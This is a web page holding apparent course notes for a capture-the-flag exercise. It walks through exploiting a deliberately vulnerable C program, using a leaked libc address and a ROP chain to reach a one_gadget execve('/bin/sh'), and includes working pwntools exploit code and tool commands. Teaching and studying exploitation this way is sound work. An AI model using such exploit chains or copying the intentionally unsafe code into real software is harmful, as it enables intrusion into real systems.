<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple PWN - 0x08(one_gadget with ROP)
  #


  tags: CTF PWN eductf
  #


  one_gadget background
  #

Day25: [Misc] 我從來沒想過我會害怕寫 code

原理是在 glibc 裡面有很多會透過 execve 執行 /bin/sh、再調用外部系統指令的 assembly，當 explolit 已經得知 libc 的位之後而且可以控制 RIP 之後，就可以直接跳該位置達成 shell out，不需要再辛苦堆 stack 上的參數

  Original Code
  #

#include <stdio.h>
#include <unistd.h>

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IOBNF, 0);

    char s[0x10];

    printf("Your libc: %p", printf);
    read(0, s, 0x100);

    return 0;
}

The program has buffer overflow, however it has no backdoor method can access and has no global variable can write shellcode. Thus, we can consider to use ROP to get shell.
Note that, it must be a dynamic library, so DO NOT use -static to compile it.
gcc -o one_gadget_with_rop one_gadget_with_rop.c -no-pie -fno-stack-protector -z norelro -zexecstack



  Exploit
  #


First, we use ldd command to find what library the program will use.

In addition, we use one_gadget command to find execvs

Note that, how to use it can refer to one_gadget用法
We use 0xebcf8 execve("/bin/sh", rsi, rdx) as our method


Note: it has 3 constraint so that we can get the shell

address rbp-0x78 is writable
[rsi] == NULL || rsi == NULL
[rdx] == NULL || rdx == NULL



Then, we use one_gadget command to get ROP chain
ROPgadget --binary one_gadget_with_rop --only "pop|ret" > one_gadget
vim one_gadget
You can see that because we didn&rsquo;t compile with library, the gadget that we may can use is very few.

The solution is using the gadget that libc have:
$ ROPgadget --binary  /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" > one_gadget
$ vim one_gadget
We must satisfied one_gadget constraint. 0x90529 and 0x2be51 are the offset of /lib/x86_64-linux-gnu/libc.so.6. Therefore, if we want to call these gadget, we must find out the real base address of /lib/x86_64-linux-gnu/libc.so.6.


Because, ASLR is turn on in default, so the address of library will be random, we just know the offset of library. In original code, it told us the printf address in /lib/x86_64-linux-gnu/libc.so.6 → 0x7ffff7def770

Used gdb can find the current address of library → 0x7ffff7d8f000

Then we can know the offset and construct apart of payload as below
$$0x7ffff7def770 - 0x7ffff7d8f000 = 0x60770$$
from pwn import *
import sys

context.arch = &#39;amd64&#39;

r = process(&#39;./one_gadget_with_rop&#39;)

r.recvuntil("Your libc: ")
libc = int(r.recv(14), 16) - 0x60770
info(f"libc: {hex(libc)}")

And prepare our gadget:
pop_rdx_rbx_ret = libc + 0x90529
pop_rsi_ret = libc + 0x2be51

Construct whole payload with considering the constraint:
r.send(b&#39;a&#39;*0x10 + p64(0x404000) + p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) + p64(libc+0xebcf8))
r.interactivae()

b&#39;a&#39;*0x10 is for $rsi
p64(0x404000) is an arbitrary writable and readable address for $rbp-0x78 one of the constraint of one_gadget
p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) is what we did in last lecture of ROP
p64(libc+0xebcf8) is the one_gadget that we choose at the beginning.


Finally, we got shell!!!



  Reference
  #

Linux ldd 查看執行檔執行時需要哪些 library
Pwn week1'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple PWN - 0x08(one_gadget with ROP)"><meta property="og:description" content='Simple PWN - 0x08(one_gadget with ROP) # tags: CTF PWN eductf # one_gadget background # Day25: [Misc] 我從來沒想過我會害怕寫 code
原理是在 glibc 裡面有很多會透過 execve 執行 /bin/sh、再調用外部系統指令的 assembly，當 explolit 已經得知 libc 的位之後而且可以控制 RIP 之後，就可以直接跳該位置達成 shell out，不需要再辛苦堆 stack 上的參數
Original Code # #include <stdio.h> #include <unistd.h> int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IOBNF, 0); char s[0x10]; printf("Your libc: %p", printf); read(0, s, 0x100); return 0; } The program has buffer overflow, however it has no backdoor method can access and has no global variable can write shellcode. Thus, we can consider to use ROP to get shell. Note that, it must be a dynamic library, so DO NOT use -static to compile it. gcc -o one_gadget_with_rop one_gadget_with_rop.c -no-pie -fno-stack-protector -z norelro -zexecstack Exploit # First, we use ldd command to find what library the program will use. In addition, we use one_gadget command to find execvs Note that, how to use it can refer to one_gadget用法 We use 0xebcf8 execve("/bin/sh", rsi, rdx) as our method Note: it has 3 constraint so that we can get the shell address rbp-0x78 is writable [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL Then, we use one_gadget command to get ROP chain ROPgadget --binary one_gadget_with_rop --only "pop|ret" > one_gadget vim one_gadget You can see that because we didn’t compile with library, the gadget that we may can use is very few. The solution is using the gadget that libc have: $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" > one_gadget $ vim one_gadget We must satisfied one_gadget constraint. 0x90529 and 0x2be51 are the offset of /lib/x86_64-linux-gnu/libc.so.6. Therefore, if we want to call these gadget, we must find out the real base address of /lib/x86_64-linux-gnu/libc.so.6. Because, ASLR is turn on in default, so the address of library will be random, we just know the offset of library. In original code, it told us the printf address in /lib/x86_64-linux-gnu/libc.so.6 → 0x7ffff7def770 Used gdb can find the current address of library → 0x7ffff7d8f000 Then we can know the offset and construct apart of payload as below $$0x7ffff7def770 - 0x7ffff7d8f000 = 0x60770$$ from pwn import * import sys context.arch = &#39;amd64&#39; r = process(&#39;./one_gadget_with_rop&#39;) r.recvuntil("Your libc: ") libc = int(r.recv(14), 16) - 0x60770 info(f"libc: {hex(libc)}") And prepare our gadget: pop_rdx_rbx_ret = libc + 0x90529 pop_rsi_ret = libc + 0x2be51 Construct whole payload with considering the constraint: r.send(b&#39;a&#39;*0x10 + p64(0x404000) + p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) + p64(libc+0xebcf8)) r.interactivae() b&#39;a&#39;*0x10 is for $rsi p64(0x404000) is an arbitrary writable and readable address for $rbp-0x78 one of the constraint of one_gadget p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) is what we did in last lecture of ROP p64(libc+0xebcf8) is the one_gadget that we choose at the beginning. Finally, we got shell!!! Reference # Linux ldd 查看執行檔執行時需要哪些 library Pwn week1'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><meta property="article:tag" content="Eductf"><title>Simple PWN - 0x08(one_gadget with ROP) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple PWN - 0x08(one_gadget with ROP)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#one_gadget-background>one_gadget background</a></li><li><a href=#original-code>Original Code</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-pwn---0x08one_gadget-with-rop>Simple PWN - 0x08(one_gadget with ROP)
<a class=anchor href=#simple-pwn---0x08one_gadget-with-rop>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><h2 id=one_gadget-background>one_gadget background
<a class=anchor href=#one_gadget-background>#</a></h2><p><a href=https://ithelp.ithome.com.tw/articles/10226977>Day25: [Misc] 我從來沒想過我會害怕寫 code</a></p><blockquote><p>原理是在 <code>glibc</code> 裡面有很多會透過 <code>execve</code> 執行 <code>/bin/sh</code>、再調用外部系統指令的 assembly，當 explolit 已經得知 <code>libc</code> 的位之後而且可以控制 RIP 之後，就可以直接跳該位置達成 shell out，不需要再辛苦堆 stack 上的參數</p></blockquote><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><pre tabindex=0><code class="language-cpp!=" data-lang="cpp!=">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IOBNF, 0);

    char s[0x10];

    printf(&#34;Your libc: %p&#34;, printf);
    read(0, s, 0x100);

    return 0;
}
</code></pre><ul><li>The program has buffer overflow, however it has no backdoor method can access and has no global variable can write shellcode. Thus, we can consider to use <code>ROP</code> to get shell.</li><li>Note that, it must be a dynamic library, so DO NOT use <code>-static</code> to compile it.<pre tabindex=0><code class=language-bash! data-lang=bash!>gcc -o one_gadget_with_rop one_gadget_with_rop.c -no-pie -fno-stack-protector -z norelro -zexecstack
</code></pre></li></ul><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><ul><li>First, we use <a href=https://shengyu7697.github.io/linux-ldd/><font color=FF0000><code>ldd</code></font></a> command to find what library the program will use.
<img src=https://imgur.com/ycRb8Tv.png alt></li><li>In addition, we use <code>one_gadget</code> command to find <code>execvs</code><ul><li>Note that, how to use it can refer to <a href=https://blog.csdn.net/weixin_43092232/article/details/105085880>one_gadget用法</a></li><li>We use <code>0xebcf8 execve("/bin/sh", rsi, rdx)</code> as our method
<img src=https://imgur.com/Y7BBH5J.png alt><ul><li><font color=FF0000>Note:</font> it has 3 constraint so that we can get the shell</li></ul><pre tabindex=0><code class=language-bash! data-lang=bash!>address rbp-0x78 is writable
[rsi] == NULL || rsi == NULL
[rdx] == NULL || rdx == NULL
</code></pre></li></ul></li><li>Then, we use <code>one_gadget</code> command to get <code>ROP</code> chain<pre tabindex=0><code class=language-bash! data-lang=bash!>ROPgadget --binary one_gadget_with_rop --only &#34;pop|ret&#34; &gt; one_gadget
vim one_gadget
</code></pre>You can see that because we didn&rsquo;t compile with library, the gadget that we may can use is very few.
<img src=https://imgur.com/DuGINHL.png alt>
The solution is using the gadget that <code>libc</code> have:<pre tabindex=0><code class=language-bash! data-lang=bash!>$ ROPgadget --binary  /lib/x86_64-linux-gnu/libc.so.6 --only &#34;pop|ret&#34; &gt; one_gadget
$ vim one_gadget
</code></pre>We must satisfied one_gadget constraint. <code>0x90529</code> and <code>0x2be51</code> are the offset of <code>/lib/x86_64-linux-gnu/libc.so.6</code>. Therefore, if we want to call these gadget, <font color=FF0000>we must find out the real base address of <code>/lib/x86_64-linux-gnu/libc.so.6</code></font>.
<img src=https://imgur.com/3h5PqcO.png alt>
<img src=https://imgur.com/Z2bBbhJ.png alt></li><li>Because, <code>ASLR</code> is turn on in default, so the address of library will be random, we just know the offset of library. In original code, it told us the <code>printf</code> address in <code>/lib/x86_64-linux-gnu/libc.so.6</code> → <font color=FF0000><code>0x7ffff7def770</code></font>
<img src=https://imgur.com/nuYGx24.png alt>
Used <code>gdb</code> can find the current address of library → <font color=FF0000><code>0x7ffff7d8f000</code></font>
<img src=https://imgur.com/Et3r2hI.png alt>
Then we can know the offset and construct apart of payload as below
$$0x7ffff7def770 - 0x7ffff7d8f000 = 0x60770$$<pre tabindex=0><code class="language-python!=" data-lang="python!=">from pwn import *
import sys

context.arch = &#39;amd64&#39;

r = process(&#39;./one_gadget_with_rop&#39;)

r.recvuntil(&#34;Your libc: &#34;)
libc = int(r.recv(14), 16) - 0x60770
info(f&#34;libc: {hex(libc)}&#34;)
</code></pre></li><li>And prepare our gadget:<pre tabindex=0><code class="language-python!=11" data-lang="python!=11">pop_rdx_rbx_ret = libc + 0x90529
pop_rsi_ret = libc + 0x2be51
</code></pre></li><li>Construct whole payload with considering the constraint:<pre tabindex=0><code class="language-python!=13" data-lang="python!=13">r.send(b&#39;a&#39;*0x10 + p64(0x404000) + p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) + p64(libc+0xebcf8))
r.interactivae()
</code></pre><ul><li><code>b'a'*0x10</code> is for <code>$rsi</code></li><li><code>p64(0x404000)</code> is an arbitrary writable and readable address for <code>$rbp-0x78</code> one of the constraint of one_gadget</li><li><code>p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0)</code> is what we did in <a href=https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/rki3GF0cs>last lecture</a> of <code>ROP</code></li><li><code>p64(libc+0xebcf8)</code> is the one_gadget that we choose at the beginning.</li></ul></li><li>Finally, we got shell!!!
<img src=https://imgur.com/iIETaBy.png alt></li></ul><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><p><a href=https://shengyu7697.github.io/linux-ldd/>Linux ldd 查看執行檔執行時需要哪些 library</a>
<a href=https://youtu.be/ktoVQB99Gj4>Pwn week1</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#one_gadget-background>one_gadget background</a></li><li><a href=#original-code>Original Code</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>